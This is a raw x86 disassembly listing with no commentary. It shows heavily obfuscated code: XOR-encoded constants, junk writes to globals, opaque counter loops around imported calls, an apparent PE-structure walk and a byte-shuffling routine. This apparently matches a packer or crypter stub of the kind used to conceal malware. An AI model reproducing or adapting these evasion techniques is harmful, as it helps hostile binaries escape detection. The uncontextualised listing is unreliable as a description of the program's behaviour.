  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ae6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cee
  41afcc:	mov    ecx,DWORD PTR ds:0x421a5e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238a2
  41b017:	push   0x423822
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c66
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237fd
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423814
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c86
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bdc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423972
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ac1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d7a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c66
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
